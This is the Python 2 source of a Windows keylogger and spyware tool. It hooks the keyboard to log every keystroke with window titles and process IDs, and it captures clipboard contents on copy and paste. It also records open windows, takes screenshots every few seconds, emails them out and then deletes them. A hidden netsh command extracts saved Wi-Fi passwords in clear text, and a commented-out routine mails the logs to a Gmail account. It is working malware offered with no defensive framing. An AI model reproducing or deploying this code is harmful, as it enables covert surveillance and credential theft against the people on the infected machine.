#!/usr/bin/env python

# All of the program settings are definced in Settings.py
from Settings import *
from paths import *
from get_history import *
from send_emails import *


def save_to_file(logs, file_name):

    """This function saves the logs into
        a text file"""
    
    global folder_path

    # if the folder does not exist, create one
    if not os.path.exists(folder_path):
          os.mkdir(folder_path)

    # write to the file                       
    output_file = open(file_name,"a+")
    output_file.write(logs)
    output_file.close()


    
def get_current_process():

    """This function get the process ID of the program
    
    """
    # get the active window handle
    window_handle = user32.GetForegroundWindow()
    
    # get the acitve program process ID
    program_pid = c_ulong(0) 
    user32.GetWindowThreadProcessId(window_handle, byref(program_pid))

    # store the current program process ID
    process_id = "%d" % program_pid.value

    # using the process id , grab the program (exe) path
    program_path = create_string_buffer("\0x00" * 512)
    h_process = kernel32.OpenProcess(0x400 | 0x10, False, program_pid)

    psapi.GetModuleBaseNameA(h_process,None, byref(program_path), 512)

    # read the active window title
    window_title = create_string_buffer("\0x00" * 512)
    length = user32.GetWindowTextA(window_handle, byref(window_title),512)

    # get the path of the program
    #TODO

    # save the window name in a file
    save_to_file("\n\n"+"[*] [PID: %s %s %s]" % (process_id, program_path.value, window_title.value), logs_file)
    
    # close the hanldes
    kernel32.CloseHandle(window_handle)
    kernel32.CloseHandle(h_process)
    


def key_logging(key_thread, timer, file_name): #DONE
    
            """"This function for keylogging """ # TODO WRITE MEANINGFUL COMMENT
    
            global logging_output, logging_status,logging_date,logs_file


            # Threading
            #threading.Timer(1, key_logging, [key_thread,timer, file_name]).start()
            
            #logging_output += "\n"
            logging_status = True
            main_thread_id = win32api.GetCurrentThreadId()
    
            w = win32gui
            current_window = w.GetWindowText (w.GetForegroundWindow())
            
            # open file to write
            save_to_file(logging_output, logs_file)

            # keylogging magic
            hooks_manager = pyHook.HookManager()
            hooks_manager.KeyDown = capture_key_strokes # captures keydown stores
            hooks_manager.HookKeyboard()
            pythoncom.PumpMessages()
            
            logging_status = False
            
            return True


def capture_key_strokes(event):

    """This function captures keystrokes and special keys
        from the target keyboard"""

    global current_window, logging_output, logging_status, logs_file

    if logging_status == False:
        return True

    logging_output = ""
    output_file = open(logs_file,"a")
    
    wg = win32gui
    active_window = wg.GetWindowText (wg.GetForegroundWindow())

    if active_window != current_window:
        
        # Display the logs is a formatted way
        
        get_current_process()
        logging_date = str(datetime.datetime.now())
        logging_output += "\n"+"[*] " + " Date & Time: " + " [ " + logging_date +  " ]" + "\n"
        logging_output += "=" * len(active_window) + "====\n"
        logging_output += " " + active_window + "|\n"
        logging_output += "=" * len(active_window) + "===\n"
        current_window = active_window
        output_file.write(logging_output) ## added
    
    logging_output = ""

    # TO-DO : Back Space, Enter  
    if event.Ascii == 8:
        logging_output += "\b"
        
    elif event.Ascii == 13 or event.Ascii == 9:
        logging_output += "\n"
        
    else:
        # add 
        logging_output += chr(event.Ascii)
        
    # add logs to the file
    output_file.write(logging_output)
    output_file.close()

    # get content of the clipboard
    clip_board(event)
    
    # get special characters
    formate_special_chars(event)

    # TODO add extra formating
    return True 


def clip_board(event):

    """This function gets what is pasted
        on the clipboard"""

    # dict for shortcuts
    clip_board_shortcut = {

        3:"Copy to Clipboard [Ctrl + C]",
        22: "Paste to Clipboard [Ctrl + V]",
        24: "Cut to Clipboard [Ctrl + X]"
    }

    # if one of the shourtcuts presses, get its content
    if event.Ascii in clip_board_shortcut:
        
        win32clipboard.OpenClipboard()
        
        # retrieve the clipbaord data 
        clipboard_value = win32clipboard.GetClipboardData()

        # close the clipboard
        win32clipboard.CloseClipboard()

        # save to the file, the shortcut and the content
        save_to_file("\n\nClipboar Content: \n\n", logs_file)
        save_to_file(clip_board_shortcut[event.Ascii]+ clipboard_value  + "\n", logs_file)
        

def formate_special_chars(event):
    
    """This function formats the irregular chars
        such as -Sapce, Backspace, ESC, Enter, Tab,
        Del, Insert"""
    global logs_file
    
    chars = {
        8 : '[BS]',  13: '\n',
        9 : '\t',      16: '[Shift]',
        17: '[Ctrl]',     18: '[Alt]',
        38: '[Caps lock]',27:'[Escape]',
        32: ' ', 
          }

    # add chars to the file
    if event.Ascii in chars :
        save_to_file(chars[event.Ascii], logs_file)

        
def get_all_open_windows(): # TO-DO: break them into more function

    """This function return all open windows
        on the host mahcine"""

    threading.Timer(60 , get_all_open_windows).start()
    
    active_windows = [] # list of active programs on the "Windows" machine

    def foreach_window(hwnd, lParam):

          if is_window_visible(hwnd):
                window_length = get_window_text_length(hwnd)
                new_buffer = ctypes.create_unicode_buffer(window_length + 1)
                get_window_text(hwnd, new_buffer, window_length + 1)
                active_windows.append(new_buffer.value)
          return True
                
    get_windows(get_windows_proc(foreach_window), 0)

    # remove extra spaces
    new_active_windows = []

    for win in active_windows:
        if win != "":
            new_active_windows.append(win)
       
    # save the open windows to file
    save_to_file("\n\n"+"[*] Active Window: " + "\n",logs_file)
    for window in new_active_windows:
         #save_to_file("[*] Window Name: " + unicode(window),logs_file)
         save_to_file(window.encode('utf-8'),logs_file)
         save_to_file('\n',logs_file)
    save_to_file('=' * 50,logs_file)
    save_to_file('\n\n',logs_file)
    
    
def capture_screenshots(file_path): #DONE

    """This function takes snap shots of
        the host machine and send them by email.
        Every 13 captures image, an email is sent"""

    if not os.path.exists(file_path):
        os.mkdir(file_path)

    counter = 0 # counter to create multiple screen shots

    while True:

        time.sleep(5)
        image = ImageGrab.grab() # grab the image
        save_as = os.path.join(file_path,'ScreenShot_' +time.strftime('%Y_%m_%d') + str(counter) + '.jpg') 
        image.save(save_as)
        counter += 1

        if counter == 3:
            print "there is 3 pics in the folder"
            send_new_email(file_path)
            delete_images(file_path)
            counter = 0 


def delete_images(file_name): #Done

    """This function deltes files permenantly"""
    
    for image in glob.glob(file_name + '\\*.jpg'):
        # delete all images that ends with .jpg permenatly
        os.unlink(image)

def delete_files(file_name): #Done

    """This function deltes files permenantly"""
    
    for files in glob.glob(file_name + '\\*.txt'):
        # delete all images that ends with .jpg permenatly
        os.unlink(files)
                    

##def send_new_email(folder_path):
##    
##    """This function sends logs through emails"""
##    
##    login_pass = ''
##    to_ = 'keyplexer@gmail.com'
##    from_ = 'keyplexer@gmail.com'
##    
##    # Create the container (outer) email message.
##    message = MIMEMultipart()
##    message['Subject'] = 'Great Trip'
##    message['From'] = from_
##    message['To'] = to_
##
##    # Assume we know that the image files are all in PNG format
##    
##    if folder_path.endswith('Screenshots'):
##        for file in glob.glob(folder_path + '\\*.jpg'):
##            images_file = open(file, 'rb')
##            img = MIMEImage(images_file.read())
##            images_file.close()
##            message.attach(img)
##
##   
##    elif folder_path.endswith('Logs'):
##        
##        for file in glob.glob(folder_path + '\\*.txt'):
##    
##            # if the file ends with txt, attach it
##            if file.endswith('.txt'):
##                #Encoders.encode_base64(message)
##                output_file = open(file)
##                attachment = MIMEText(output_file.read())
##                output_file.close()
##    
##            # attach the file
##            attachment.add_header('Content-Disposition', 'attachment; filename="%s"' % os.path.basename(file))
##            message.attach(attachment)
##         
##    else:
##        # TO DO "SEND ALERT EMAIL OR MESSAGE"
##        print "NOT JPG FILE"
##        
##    # Send the email
##    smtp_server = smtplib.SMTP('smtp.gmail.com:587')
##    smtp_server.starttls() # adds TLS encyprtion
##    smtp_server.login(to_, login_pass)
##    smtp_server.sendmail(to_, from_, message.as_string())
##    smtp_server.quit()


def send_txt_message():
 
    """This function uses send text messages
        with the current status"""
    pass


def get_wifi_credentials():

    """This function get the credentials of the connected
        interface"""
    
    threading.Timer(6, get_wifi_credentials).start() 
    
   # try:
    file_name = open(creds, "a+")
    
    # execture cmd commands silently wihtout poping window
    si = subprocess.STARTUPINFO()

    # dwflag is a parameter that tells the function
    # what type of information to gather
    si.dwFlags = subprocess.STARTF_USESHOWWINDOW

    # execute interface command to show the current connected interface,
    # the command is exexuted silently
    subprocess.call("netsh wlan show interfaces", stdout=file_name , startupinfo=si)

    # Once the command executer, get the name of the interface
    # extract all words and put them in a list
    creds_file = open(creds, 'r')
    text = creds_file.read()
    creds_file.close()
    
    # look for the colon that separates profile name form the actual name
    text = re.sub('[\: \']+', " ", text)
    words = list(text.split())


    # loop through the list and get the interface name
    output_list = []
    for word in words:
        output_list.append(word)

    word_index = output_list.index('connected') + 2

    #print output_list[word_index]

    # if word "Profile" in the saved file, get the password credentials of the connected
    # interface
    if 'Profile' in open(creds).read():
        subprocess.call("netsh wlan show profile name="+ output_list[word_index] + " key=clear", stdout=file_name, startupinfo=si)
    else:
        print "False"

##    except:
##                # TODO SEND AN ALERT EMAIL WITH ERRO
##                print "There is something worng with extarcting wifi passwords"
##
            
            
def begin_logging():
    
    """This is the main function """
    
    # Begin keylogging
    keyLogging = Thread(target=key_logging, args=(logging_key_thread,timer,logs_file))
    keyLogging.start()

    # get active windows:
    get_all_open_windows()

    # send emails
    #send_new_email(folder_path)
    
    # wifi:
    #get_wifi_credentials()

    # Get Chrome/Firefox:
    #get_all_history()
    
    # Check the connection to send the files
    #while True:
      #   time.sleep(5)
     #    
         # get the connection status
       #  get_current_connection()
                


